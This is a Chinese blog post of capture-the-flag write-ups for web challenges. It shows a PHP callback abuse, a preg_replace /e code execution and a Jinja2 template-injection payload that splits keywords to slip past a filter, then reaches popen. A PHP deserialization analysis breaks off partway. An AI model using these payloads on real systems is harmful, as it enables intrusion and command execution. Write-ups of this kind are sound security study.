<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【比赛】青少年CTF-S1·2026公益赛 | 落殷回的博客</title><meta name="author" content="luoyinhui"><meta name="copyright" content="luoyinhui"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="菜鸟一个，很多都是ai解完再回头复盘的，力扣原题更是纯ai，存档咯如果伤害了你的眼睛抱歉">
<meta property="og:type" content="article">
<meta property="og:title" content="【比赛】青少年CTF-S1·2026公益赛">
<meta property="og:url" content="https://luoyinhui.github.io/posts/659617ad/index.html">
<meta property="og:site_name" content="落殷回的博客">
<meta property="og:description" content="菜鸟一个，很多都是ai解完再回头复盘的，力扣原题更是纯ai，存档咯如果伤害了你的眼睛抱歉">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png">
<meta property="article:published_time" content="2026-01-05T00:47:32.000Z">
<meta property="article:modified_time" content="2026-01-15T09:45:33.083Z">
<meta property="article:author" content="luoyinhui">
<meta property="article:tag" content="2026">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="青少年CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "【比赛】青少年CTF-S1·2026公益赛",
  "url": "https://luoyinhui.github.io/posts/659617ad/",
  "image": "https://luoyinhui.github.io/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png",
  "datePublished": "2026-01-05T00:47:32.000Z",
  "dateModified": "2026-01-15T09:45:33.083Z",
  "author": [
    {
      "@type": "Person",
      "name": "luoyinhui",
      "url": "https://luoyinhui.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/zhandian.png"><link rel="canonical" href="https://luoyinhui.github.io/posts/659617ad/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.0.1"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"DLCXYNBEA7","apiKey":"55cb2783d393395612712be2263ebaf1","indexName":"index","hitsPerPage":10,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":1000,"languages":{"author":"作者: luoyinhui","link":"链接: ","source":"来源: 落殷回的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'medium_zoom',
  Snackbar: undefined,
  infinitegrid: {
    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.12.0',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【比赛】青少年CTF-S1·2026公益赛',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><style>
  .aplayer .aplayer-notice{display:none!important}
</style>
<link rel="stylesheet" href="/css/custom.css"><style>:root { --glass-opacity-light: 0.5; --glass-opacity-dark: 0.2; --post-glass-opacity-light: 0.8; --post-glass-opacity-dark: 0.2; }</style><!-- hexo injector head_end start --><style>/* CSS for Hexo Butterfly Updates Heatmap */
.updates-heatmap {
  margin-bottom: 20px;
  padding: 20px;
  background: var(--card-bg, #fff);
  border-radius: 8px;
  box-shadow: var(--card-box-shadow, 0 3px 8px 6px rgba(7, 17, 27, 0.05));
  width: 100%;
  overflow: hidden;
  color: var(--font-color, #333);
}

[data-theme='dark'] .updates-heatmap {
  background: var(--card-bg, #1d1d1f);
  color: var(--font-color, #F7F7FA);
}

.heatmap-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 15px;
}

.heatmap-title {
  font-size: 1.2em;
  font-weight: bold;
  outline: none;
  border-bottom: 1px dashed transparent;
}

.heatmap-title:focus {
  border-bottom: 1px dashed #999;
}

.heatmap-legend {
  display: flex;
  align-items: center;
  font-size: 12px;
  color: var(--font-color, #888);
  gap: 4px;
}

.legend-item {
  display: flex;
  align-items: center;
  gap: 2px;
}

.legend-color {
  width: 10px;
  height: 10px;
  border-radius: 2px;
  display: inline-block;
}

.legend-label {
  color: var(--font-color, #888);
  margin: 0 4px;
}

.heatmap-container {
  width: 100%;
  display: flex;
  flex-direction: column;
}

.heatmap-months {
  display: grid;
  grid-template-columns: repeat(53, 1fr);
  margin-bottom: 5px;
  width: 100%;
}

.heatmap-month-label {
  font-size: 12px;
  color: var(--font-color, #888);
  grid-column: span 1;
  overflow: visible;
  white-space: nowrap;
}

.heatmap-grid {
  display: grid;
  grid-template-columns: repeat(53, 1fr);
  grid-template-rows: repeat(7, 1fr);
  grid-auto-flow: column;
  gap: 2px;
  width: 100%;
}

.heatmap-day {
  width: 100%;
  aspect-ratio: 1;
  border-radius: 2px;
  background-color: #ebedf0;
}

[data-theme='dark'] .heatmap-day {
  background-color: #2d333b;
}

.legend-color.level-0 { background-color: #ebedf0; }
[data-theme='dark'] .legend-color.level-0 { background-color: #2d333b; }

/* Green Theme */
.theme-green .level-1 { background-color: #9be9a8; }
.theme-green .level-2 { background-color: #40c463; }
.theme-green .level-3 { background-color: #30a14e; }
.theme-green .level-4 { background-color: #216e39; }

/* Blue Theme */
.theme-blue .level-1 { background-color: #a8d1ff; }
.theme-blue .level-2 { background-color: #63a7ff; }
.theme-blue .level-3 { background-color: #3079e0; }
.theme-blue .level-4 { background-color: #1a56ad; }

/* Pink Theme */
.theme-pink .level-1 { background-color: #ffc9c9; }
.theme-pink .level-2 { background-color: #ff8585; }
.theme-pink .level-3 { background-color: #e04545; }
.theme-pink .level-4 { background-color: #ad1a1a; }

/* Red Theme */
.theme-red .level-1 { background-color: #ffdce0; }
.theme-red .level-2 { background-color: #ff9b9b; }
.theme-red .level-3 { background-color: #ff4b4b; }
.theme-red .level-4 { background-color: #c91a1a; }

/* Orange Theme */
.theme-orange .level-1 { background-color: #ffe8cc; }
.theme-orange .level-2 { background-color: #ffb366; }
.theme-orange .level-3 { background-color: #ff8c1a; }
.theme-orange .level-4 { background-color: #cc6600; }

/* Purple Theme */
.theme-purple .level-1 { background-color: #e6ccff; }
.theme-purple .level-2 { background-color: #b366ff; }
.theme-purple .level-3 { background-color: #8c1aff; }
.theme-purple .level-4 { background-color: #6600cc; }

.updates-show-more-btn {
  text-align: center;
  cursor: pointer;
  padding: 10px 0;
  background: var(--card-bg, #fff);
  color: #49b1f5;
  border: 1px solid #ddd;
  border-radius: 8px;
  margin: 20px 0;
  width: 100%;
  transition: all 0.3s;
  user-select: none;
  display: block;
  visibility: visible;
  opacity: 1;
  font-size: 1.1em;
}

[data-theme='dark'] .updates-show-more-btn {
  background: var(--card-bg, #1d1d1f);
  color: #49b1f5;
  border: 1px solid #3d3d3d;
}

.updates-show-more-btn:hover {
  background: #f0f0f0;
  color: #FF7242;
}

[data-theme='dark'] .updates-show-more-btn:hover {
  background: #3d3d3d;
}

.year-label {
  text-align: center;
  margin-top: 10px;
  font-size: 0.9em;
  color: var(--font-color, #999);
}
</style><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="落殷回的博客" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="落殷回的博客" type="application/rss+xml">
</head><body><div id="web_bg" style="background-image: url(/img/shouye.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">落殷回的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">【比赛】青少年CTF-S1·2026公益赛</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li><li><a class="site-page child" href="/updates/"><i class="fa-fw fas fa-history"></i><span> 更新</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【比赛】青少年CTF-S1·2026公益赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-05T00:47:32.000Z" title="发表于 2026-01-05 08:47:32">2026-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-15T09:45:33.083Z" title="更新于 2026-01-15 17:45:33">2026-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;作者已经&quot;,&quot;messageNext&quot;:&quot;天没有更新了！！可能内容过时哦，如果您发现错误并希望告诉作者，请评论区留言或者向yluo3383@gmail.com发送邮件。&quot;,&quot;postUpdate&quot;:&quot;2026-01-15 17:45:33&quot;}" hidden></div><h1>web</h1>
<h2 id="时间胶囊留言板"><a class="header-anchor" href="#时间胶囊留言板">¶</a>时间胶囊留言板</h2>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-13.png" alt="alt text"><br>
<code>/get_content.php?id=2</code>拿到flag</p>
<h2 id="CallBack"><a class="header-anchor" href="#CallBack">¶</a>CallBack</h2>
<ul>
<li>我们有一个简单的 PHP 脚本，负责处理用户输入，并通过回调函数对数组进行操作，然而，这个脚本并未对输入进行严格的过滤。你是否能发现某些细节并利用它来深入了解更多信息？</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数 executeCallback，接收一个回调函数作为参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeCallback</span>(<span class="params"><span class="variable">$callback</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个数组 [0, 1, 2, 3]</span></span><br><span class="line">    <span class="variable">$someArray</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 array_map 对数组每个元素应用回调函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_map</span>(<span class="variable">$callback</span>, <span class="variable">$someArray</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 GET 参数中是否有 &#x27;callback&#x27; 参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 直接从用户输入获取回调函数名（极度危险！）</span></span><br><span class="line">    <span class="variable">$evilCallback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行用户提供的回调函数</span></span><br><span class="line">    <span class="variable">$newArray</span> = <span class="title function_ invoke__">executeCallback</span>(<span class="variable">$evilCallback</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>可以直接利用 array_map 的回调机制：</p>
</li>
<li>
<p>array_map 会依次将数组中的元素（0, 1, 2, 3）作为参数传递给回调函数，如果我们传入 phpinfo 作为回调函数，PHP 实际上会执行：</p>
<ul>
<li>phpinfo(0)</li>
<li>phpinfo(1)</li>
<li>…<br>
phpinfo() 函数接受一个可选的整数参数来决定显示哪些信息（例如 1 表示常规信息，2 表示配置信息等）。无论参数是什么， phpinfo() 都会输出大量的系统配置信息。</li>
</ul>
</li>
<li>
<p>访问<code>/?callback=phpinfo</code>得到：</p>
</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-14.png" alt="alt text"></p>
<h2 id="preg-replace"><a class="header-anchor" href="#preg-replace">¶</a>preg_replace</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(.*)/e&quot;</span>, <span class="string">&quot;\\1&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line"><span class="comment">//使用了 /e 修饰符，这意味着 preg_replace 会将替换后的字符串作为 PHP 代码进行执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-15.png" alt="alt text"></p>
<ul>
<li>反引号绕过引号转义限制</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-16.png" alt="alt text"><br>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-17.png" alt="alt text"></p>
<h2 id="答案之书"><a class="header-anchor" href="#答案之书">¶</a>答案之书</h2>
<ul>
<li>传闻世间有一本《答案之书》，能解众生心中困惑。你只需虔诚地递上你的疑问，它便会给予你命运的指引。<br>
然而，书页之间似乎隐藏着某种古老的禁制，唯有避开那些“禁忌之语”，方能窥见真实的奥秘。</li>
<li>万物皆有裂痕，那是光照进来的地方。你能否在禁忌的边缘，寻得那最终的真相（Flag）？</li>
</ul>
<h3 id="漏洞与突破过程"><a class="header-anchor" href="#漏洞与突破过程">¶</a>漏洞与突破过程</h3>
<ol>
<li>
<p><strong>漏洞发现</strong>：<br>
向输入框提交 <code>&#123;&#123;1+1&#125;&#125;</code>，页面回显 <code>「 你虔诚地询问：2 」</code>，确认存在 <strong>Jinja2 (Python)</strong> 的 SSTI 漏洞。</p>
</li>
<li>
<p><strong>WAF 探测</strong>：<br>
系统部署了过滤器（WAF），会拦截包含 <code>class</code>, <code>mro</code>, <code>subclasses</code>, <code>config</code>, <code>os</code>, <code>system</code>, <code>__</code> (双下划线) 等敏感关键词的 Payload，并显示“非法的祈祷”。</p>
</li>
<li>
<p><strong>WAF 绕过</strong>：<br>
利用 Python 的字符串拼接特性绕过关键字检测。</p>
<ul>
<li><code>__class__</code> 替换为 <code>'_'+'_'+'cl'+'ass'+'_'+'_'</code></li>
<li><code>__mro__</code> 替换为 <code>'_'+'_'+'m'+'ro'+'_'+'_'</code></li>
<li><code>__subclasses__</code> 替换为 <code>'_'+'_'+'subc'+'lasses'+'_'+'_'</code></li>
<li><code>popen</code> 替换为 <code>'po'+'pen'</code></li>
</ul>
</li>
<li>
<p><strong>最终 Payload</strong>：<br>
我构建了一个 Python 脚本来自动拼接 Payload，通过 <code>str</code> 类的 <code>__subclasses__</code> 找到 <code>os._wrap_close</code> 类（通常包含 <code>popen</code> 方法），从而执行系统命令。</p>
</li>
</ol>
<p><strong>读取 Flag 的 Payload (概念版):</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__mro__&#x27;</span>][<span class="number">1</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实际发送的 Payload (绕过版):</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;cl&#x27;</span>+<span class="string">&#x27;ass&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;ro&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="number">1</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;subc&#x27;</span>+<span class="string">&#x27;lasses&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]()[<span class="number">132</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;in&#x27;</span>+<span class="string">&#x27;it&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;glo&#x27;</span>+<span class="string">&#x27;bals&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-18.png" alt="alt text"></p>
<h2 id="easy-php"><a class="header-anchor" href="#easy-php">¶</a>easy_php</h2>
<ol>
<li><strong>找入口</strong>：哪里接收了用户输入并进行了 <code>unserialize()</code>？</li>
<li><strong>找终点</strong>：哪里有危险函数（如 <code>system</code>, <code>eval</code>, <code>exec</code> 等）？</li>
<li><strong>找桥梁</strong>：通过魔术方法（Magic Methods）把入口和终点连起来。</li>
</ol>
<p>寻找入口</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="comment">// ... 过滤检查 ...</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>); <span class="comment">// &lt;--- 这里是入口！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们控制了 <code>$input</code> 变量。</li>
<li><code>unserialize($input)</code> 会把我们输入的字符串变成一个 PHP 对象。</li>
<li><strong>关键点</strong>：我们可以生成代码中定义的<strong>任意类</strong>的对象，并控制它们的<strong>属性值</strong>。</li>
</ul>
<p>第二步：寻找魔术方法</p>
<p>反序列化漏洞通常需要魔术方法来触发。常见的有：</p>
<ul>
<li><code>__destruct()</code>: 对象销毁时自动调用（最常用）。</li>
<li><code>__wakeup()</code>: <code>unserialize()</code> 执行前自动调用。</li>
<li><code>__toString()</code>: 对象被当做字符串输出时调用。<br>
在 <code>Monitor</code> 类中找到了 <code>__destruct()</code>：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 当对象销毁时，如果状态是 danger，则触发报警</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;status === <span class="string">&quot;danger&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;reporter-&gt;<span class="title function_ invoke__">alert</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>触发点</strong>：</p>
<ul>
<li>我们需要满足条件 <code>$this-&gt;status === &quot;danger&quot;</code>。</li>
<li>满足后，它会调用 <code>$this-&gt;reporter</code> 对象的 <code>alert()</code> 方法。<br>
第三步：寻找利用链</li>
</ul>
<p>现在我们停在 <code>Monitor::__destruct</code> 里，代码试图执行 <code>$this-&gt;reporter-&gt;alert()</code>。</p>
<p>我们需要思考：<strong><code>$this-&gt;reporter</code> 是什么？</strong></p>
